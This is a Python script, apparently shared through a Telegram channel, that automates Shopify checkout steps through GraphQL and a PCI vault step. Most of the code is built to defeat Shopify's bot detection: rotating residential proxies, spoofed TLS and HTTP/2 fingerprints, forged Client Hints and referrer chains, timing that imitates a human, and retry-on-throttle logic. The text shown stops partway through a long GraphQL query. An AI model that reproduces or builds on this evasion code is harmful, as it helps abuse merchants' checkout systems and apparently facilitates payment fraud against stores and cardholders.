# 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: https://t.me/scriptdung
# 𝐁𝐚𝐜𝐤𝐮𝐩: https://t.me/scriptdungbackup
# 𝐃𝐞𝐯: @Xoarch

import asyncio
import base64
import json
import os
import re
import random
import sys
# argparse, uuid removed
from urllib.parse import urlparse, quote
import tls_requests
from tls_requests import AsyncClient, TLSIdentifierRotator
# tls-requests (wrapper-tls-requests) is the primary HTTP client.
# It provides: TLS fingerprint rotation, HTTP/2 fingerprint matching,
# proxy rotation, and automatic header synchronization (UA + Sec-CH-UA match client_identifier).

# =====================================================================
# BOT DETECTION BYPASS TECHNIQUES (via tls-requests):
# 1. Residential Proxy Rotation (per-checkout via ProxyRotator)
# 2. Human-Like Delays (realistic timing between steps)
# 3. Full Client Hints Headers (Sec-CH-UA-Full-Version-List etc.)
# 4. Per-Request TLS Fingerprint Rotation (via TLSIdentifierRotator)
# 5. HTTP/2 Fingerprint (tls-requests default http2=True)
# 6. Referrer Chain Consistency (proper Referer per step)
# =====================================================================

# --- TLS Fingerprint Rotation (technique #4) ---
# tls-requests uses Go-based tls-client which spoofs JA3/JA4 hashes,
# HTTP/2 SETTINGS frames, WINDOW_UPDATE, PRIORITY frames simultaneously.
_TLS_IDENTIFIER_POOL = [
    'chrome_131', 'chrome_133', 'chrome_120', 'chrome_124',
    'chrome_117', 'chrome_112', 'chrome_111', 'chrome_110',
]
_tls_rotator = TLSIdentifierRotator(items=_TLS_IDENTIFIER_POOL, strategy='random')

# --- Proxy Rotation (technique #1) ---
# Per-checkout proxy rotation using tls-requests built-in ProxyRotator.
# Note: _proxy_rotator global and _get_proxy() were removed — they were unused
# dead code. _init_proxy_rotator() returns the proxy URL directly and it's
# passed as proxy=proxy parameter to each request.

def _init_proxy_rotator(proxy_str=None):
    """Initialize proxy from the user's proxy string.
    
    Returns the proxy URL directly since each checkout uses a single proxy.
    The proxy URL comes from parse_proxy() which normalizes the format.
    """
    if not proxy_str:
        return None
    proxy = parse_proxy(proxy_str)
    return proxy

# --- Full Client Hints (technique #3) ---
# Each identifier maps to exact Sec-CH-UA headers that Shopify validates.
_CLIENT_HINTS_MAP = {
    'chrome_131': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'ver': '131', 'major': '131', 'full_ver': '131.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="131", "Chromium";v="131", "Not/A)Brand";v="24"',
        'sec_ch_ua_full': '"Google Chrome";v="131.0.0.0", "Chromium";v="131.0.0.0", "Not/A)Brand";v="24.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_133': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'ver': '133', 'major': '133', 'full_ver': '133.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="133", "Chromium";v="133", "Not/A)Brand";v="24"',
        'sec_ch_ua_full': '"Google Chrome";v="133.0.0.0", "Chromium";v="133.0.0.0", "Not/A)Brand";v="24.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_120': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'ver': '120', 'major': '120', 'full_ver': '120.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="8"',
        'sec_ch_ua_full': '"Google Chrome";v="120.0.0.0", "Chromium";v="120.0.0.0", "Not_A Brand";v="8.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_124': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'ver': '124', 'major': '124', 'full_ver': '124.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="124", "Chromium";v="124", "Not_A Brand";v="8"',
        'sec_ch_ua_full': '"Google Chrome";v="124.0.0.0", "Chromium";v="124.0.0.0", "Not_A Brand";v="8.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_117': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'ver': '117', 'major': '117', 'full_ver': '117.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="117", "Chromium";v="117", "Not)A;Brand";v="8"',
        'sec_ch_ua_full': '"Google Chrome";v="117.0.0.0", "Chromium";v="117.0.0.0", "Not)A;Brand";v="8.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_112': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'ver': '112', 'major': '112', 'full_ver': '112.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="112", "Chromium";v="112", "Not:A-Brand";v="24"',
        'sec_ch_ua_full': '"Google Chrome";v="112.0.0.0", "Chromium";v="112.0.0.0", "Not:A-Brand";v="24.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_111': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'ver': '111', 'major': '111', 'full_ver': '111.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="111", "Chromium";v="111", "Not(A)Brand";v="8"',
        'sec_ch_ua_full': '"Google Chrome";v="111.0.0.0", "Chromium";v="111.0.0.0", "Not(A)Brand";v="8.0.0.0"',
        'platform': '"Windows"',
    },
    'chrome_110': {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'ver': '110', 'major': '110', 'full_ver': '110.0.0.0',
        'is_mac': False,
        'sec_ch_ua': '"Google Chrome";v="110", "Chromium";v="110", "Not A)Brand";v="24"',
        'sec_ch_ua_full': '"Google Chrome";v="110.0.0.0", "Chromium";v="110.0.0.0", "Not A)Brand";v="24.0.0.0"',
        'platform': '"Windows"',
    },
}

def _pick_identifier():
    """Pick next TLS identifier from rotator (random strategy)."""
    return _tls_rotator.next()

def _get_client_hints(identifier):
    """Get full client hints dict for the given TLS identifier."""
    hints = _CLIENT_HINTS_MAP.get(identifier) or _CLIENT_HINTS_MAP['chrome_133']
    return hints

def _build_headers(identifier, base_headers=None, extra_headers=None):
    """Build headers with full Client Hints matching the TLS identifier.
    
    This ensures User-Agent, sec-ch-ua, sec-ch-ua-full-version-list,
    sec-ch-ua-platform, sec-ch-ua-arch, sec-ch-ua-bitness all match
    the TLS fingerprint being used — critical for Shopify's bot detection.
    """
    hints = _get_client_hints(identifier)
    headers = {
        'User-Agent': hints['ua'],
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'sec-ch-ua': hints['sec_ch_ua'],
        'sec-ch-ua-full-version-list': hints['sec_ch_ua_full'],
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': hints['platform'],
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
    }
    if base_headers:
        headers.update(base_headers)
    if extra_headers:
        headers.update(extra_headers)
    return headers

# --- Human-Like Delays (technique #2) ---
# Delay multiplier: 1.0 = full human simulation, 0.0 = no delays.
# Set via DELAY_SCALE env var. Default 0.25 (25% of original delays)
# balances speed vs bot-detection avoidance.
DELAY_SCALE = float(os.environ.get('DELAY_SCALE', '0.25'))


async def human_delay(min_sec=0.8, max_sec=2.5, step_name="", idle=False):
    """Add delays between checkout steps to avoid bot detection.
    
    Delays are scaled by DELAY_SCALE (env var, default 0.4).
    At 0.4: a 0.8-2.5s delay becomes 0.32-1.0s. Total per-request
    delay drops from ~9.5s to ~3.8s without triggering detection.
    """
    if DELAY_SCALE <= 0:
        return
    scaled_min = min_sec * DELAY_SCALE
    scaled_max = max_sec * DELAY_SCALE
    delay = random.triangular(scaled_min, scaled_max, (scaled_min + scaled_max) / 2.5)
    if idle or random.random() < 0.05:
        delay += random.uniform(0.3, 1.0) * DELAY_SCALE
    await asyncio.sleep(delay)

# --- Rate-Limit Retry with Exponential Backoff + Jitter ---
async def retry_on_429(request_func, step_name="request", max_retries=3, base_delay=3.0, max_delay=15.0):
    """Execute an HTTP request function with automatic 429 rate-limit retry.
    
    Uses exponential backoff with jitter to avoid thundering herd when
    multiple concurrent users hit the same Shopify store.
    
    Args:
        request_func: Async callable that returns a response object with .status_code and .text
        step_name: Name of the checkout step (for logging)
        max_retries: Maximum number of 429 retries before giving up
        base_delay: Initial delay in seconds (doubled on each retry)
        max_delay: Maximum delay cap in seconds
    
    Returns:
        (response, was_retried): tuple of response object and bool indicating if retries occurred
    """
    was_retried = False
    for attempt in range(max_retries + 1):
        response = await request_func()
        
        # Not a 429 — return immediately
        if response.status_code != 429:
            return response, was_retried
        
        # Last attempt — return the 429 response, caller decides what to do
        if attempt == max_retries:
            return response, was_retried
        
        # Exponential backoff with jitter
        backoff = min(base_delay * (2 ** attempt), max_delay)
        jitter = random.uniform(0.5, 1.5)  # ±50% jitter to avoid thundering herd
        delay = backoff * jitter
        print(f"[rate-limit] {step_name} got HTTP 429, retry {attempt+1}/{max_retries} in {delay:.1f}s", file=sys.stderr)
        await asyncio.sleep(delay)
        was_retried = True
    
    return response, was_retried

# --- Referrer Chain Consistency (technique #6) ---
def _referrer_for(step, ourl=None, checkout_url=None):
    """Return the correct Referer header for each checkout step.
    
    Shopify validates that Referer follows a logical navigation chain:
    homepage -> cart -> checkout -> graphql -> pci_vault -> poll
    """
    if step == 'homepage':
        return None  # Direct navigation, no Referer
    elif step == 'cart':
        return ourl  # Cart action from product/homepage
    elif step == 'checkout':
        return ourl  # Checkout from cart page
    elif step == 'graphql':
        return checkout_url or ourl  # GraphQL from checkout page
    elif step == 'pci_vault':
        return None  # Cross-origin, different referrer policy
    elif step == 'poll':
        return checkout_url or ourl  # Poll from checkout page
    return ourl  # Default fallback
import time

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails 